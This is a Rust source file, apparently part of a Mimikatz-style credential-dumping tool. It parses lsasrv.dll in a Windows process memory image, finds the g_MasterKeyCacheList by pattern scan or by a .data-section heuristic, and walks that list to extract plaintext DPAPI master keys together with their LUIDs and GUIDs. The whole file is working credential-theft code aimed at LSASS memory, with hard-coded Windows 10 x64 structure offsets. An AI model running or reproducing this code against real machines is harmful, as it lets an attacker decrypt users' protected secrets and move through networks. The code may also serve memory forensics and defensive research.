use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::DpapiCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// KIWI_MASTERKEY_CACHE_ENTRY offsets (Windows 10 x64):
///   +0x00: Flink (LIST_ENTRY)
///   +0x08: Blink
///   +0x10: LUID (8 bytes)
///   +0x18: padding/unknown (8 bytes)
///   +0x20: keySize (ULONG, 4 bytes)
///   +0x24: padding (4 bytes)
///   +0x28: insertTime (FILETIME, 8 bytes)
///   +0x30: flags (ULONG + 4 pad)
///   +0x38: guid (16 bytes = GUID)
///   +0x48: key data (variable, keySize bytes)
const OFFSET_FLINK: u64 = 0x00;
const OFFSET_LUID: u64 = 0x10;
const OFFSET_KEY_SIZE: u64 = 0x20;
const OFFSET_GUID: u64 = 0x38;
const OFFSET_KEY_DATA: u64 = 0x48;

/// Extract DPAPI master key cache entries from lsasrv.dll.
///
/// Master keys are stored in plaintext in the g_MasterKeyCacheList linked list.
/// No decryption is needed.
pub fn extract_dpapi_credentials(
    vmem: &impl VirtualMemory,
    lsasrv_base: u64,
    _lsasrv_size: u32,
    _keys: &CryptoKeys,
) -> Result<Vec<(u64, DpapiCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;

    // Try .text pattern scan first, fall back to .data section scan
    let list_addr = match pe.find_section(".text") {
        Some(text) => {
            let text_base = lsasrv_base + text.virtual_address as u64;
            match patterns::find_pattern(
                vmem,
                text_base,
                text.virtual_size,
                patterns::DPAPI_MASTER_KEY_PATTERNS,
                "g_MasterKeyCacheList",
            ) {
                Ok((pattern_addr, _)) => patterns::find_list_via_lea(vmem, pattern_addr, "g_MasterKeyCacheList")?,
                Err(e) => {
                    log::debug!("DPAPI .text pattern scan failed ({}), trying .data fallback", e);
                    find_dpapi_list_in_data(vmem, &pe, lsasrv_base)?
                }
            }
        }
        None => find_dpapi_list_in_data(vmem, &pe, lsasrv_base)?,
    };

    log::info!("DPAPI g_MasterKeyCacheList at 0x{:x}", list_addr);
    walk_masterkey_list(vmem, list_addr)
}

/// Walk the g_MasterKeyCacheList linked list and extract entries.
fn walk_masterkey_list(
    vmem: &impl VirtualMemory,
    list_addr: u64,
) -> Result<Vec<(u64, DpapiCredential)>> {
    let mut results = Vec::new();

    let head_flink = vmem.read_virt_u64(list_addr)?;
    if head_flink == 0 || head_flink == list_addr {
        log::info!("DPAPI: master key cache is empty");
        return Ok(results);
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + OFFSET_LUID).unwrap_or(0);
        let key_size = vmem.read_virt_u32(current + OFFSET_KEY_SIZE).unwrap_or(0);

        if key_size > 0 && key_size <= 256 {
            if let Ok(guid_bytes) = vmem.read_virt_bytes(current + OFFSET_GUID, 16) {
                let guid = format_guid(&guid_bytes);
                if let Ok(key) = vmem.read_virt_bytes(current + OFFSET_KEY_DATA, key_size as usize) {
                    log::debug!(
                        "DPAPI: LUID=0x{:x} GUID={} key_size={}",
                        luid, guid, key_size
                    );
                    results.push((
                        luid,
                        DpapiCredential {
                            guid,
                            key,
                            key_size,
                        },
                    ));
                }
            }
        }

        current = match vmem.read_virt_u64(current + OFFSET_FLINK) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    log::info!("DPAPI: found {} master key cache entries", results.len());
    Ok(results)
}

/// Fallback: scan lsasrv.dll .data section for g_MasterKeyCacheList LIST_ENTRY head.
///
/// Validates candidates by checking that the first entry looks like a
/// KIWI_MASTERKEY_CACHE_ENTRY (reasonable keySize, readable GUID).
fn find_dpapi_list_in_data(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    lsasrv_base: u64,
) -> Result<u64> {
    let data_sec = pe
        .find_section(".data")
        .ok_or_else(|| crate::error::GovmemError::PatternNotFound(
            ".data section in lsasrv.dll".to_string(),
        ))?;

    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x20000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    log::debug!(
        "DPAPI: scanning lsasrv.dll .data for g_MasterKeyCacheList: base=0x{:x} size=0x{:x}",
        data_base, data_size
    );

    for off in (0..data_size.saturating_sub(16)).step_by(8) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());

        // Both must be valid heap pointers or self-referencing
        if flink < 0x10000 || (flink >> 48) != 0 {
            continue;
        }
        if blink < 0x10000 || (blink >> 48) != 0 {
            continue;
        }
        // Must not point within lsasrv.dll itself (would be a different global)
        if flink >= lsasrv_base && flink < lsasrv_base + 0x200000 {
            continue;
        }

        let list_addr = data_base + off as u64;

        // Self-referencing empty list is valid
        if flink == list_addr && blink == list_addr {
            continue; // Empty list, skip (could be any LIST_ENTRY)
        }

        // Validate: first entry's Flink should point back or forward validly
        let entry_flink = match vmem.read_virt_u64(flink) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if entry_flink != list_addr && (entry_flink < 0x10000 || (entry_flink >> 48) != 0) {
            continue;
        }

        // Validate: LUID at +0x10 should be reasonable
        let luid = match vmem.read_virt_u64(flink + OFFSET_LUID) {
            Ok(l) => l,
            Err(_) => continue,
        };
        if luid > 0xFFFFFFFF {
            continue;
        }

        // Validate: first entry should have a reasonable keySize at +0x20
        // Typical master key sizes: 64 bytes (SHA1-based) or 48 bytes
        let key_size = match vmem.read_virt_u32(flink + OFFSET_KEY_SIZE) {
            Ok(k) => k,
            Err(_) => continue,
        };
        if key_size == 0 || key_size > 256 {
            continue;
        }
        // Most DPAPI master keys are exactly 64 bytes
        if key_size != 64 && key_size != 48 && key_size != 32 {
            continue;
        }

        // Validate: GUID at +0x38 should not be all zeros and should look plausible
        let guid_bytes = match vmem.read_virt_bytes(flink + OFFSET_GUID, 16) {
            Ok(g) => g,
            Err(_) => continue,
        };
        if guid_bytes.iter().all(|&b| b == 0) {
            continue;
        }
        // A valid GUID should have some non-zero bytes spread across Data1-Data4
        let d1 = u32::from_le_bytes([guid_bytes[0], guid_bytes[1], guid_bytes[2], guid_bytes[3]]);
        let d2 = u16::from_le_bytes([guid_bytes[4], guid_bytes[5]]);
        if d1 == 0 || d2 == 0 {
            continue;
        }

        log::debug!(
            "DPAPI: found g_MasterKeyCacheList candidate at 0x{:x}: flink=0x{:x} key_size={}",
            list_addr, flink, key_size
        );
        return Ok(list_addr);
    }

    Err(crate::error::GovmemError::PatternNotFound(
        "g_MasterKeyCacheList in lsasrv.dll .data section".to_string(),
    ))
}

/// Format a 16-byte GUID as "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx".
fn format_guid(bytes: &[u8]) -> String {
    if bytes.len() < 16 {
        return hex::encode(bytes);
    }
    // GUID layout: Data1 (LE u32), Data2 (LE u16), Data3 (LE u16), Data4 (8 bytes)
    let d1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
    let d2 = u16::from_le_bytes([bytes[4], bytes[5]]);
    let d3 = u16::from_le_bytes([bytes[6], bytes[7]]);
    format!(
        "{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        d1, d2, d3,
        bytes[8], bytes[9],
        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
    )
}
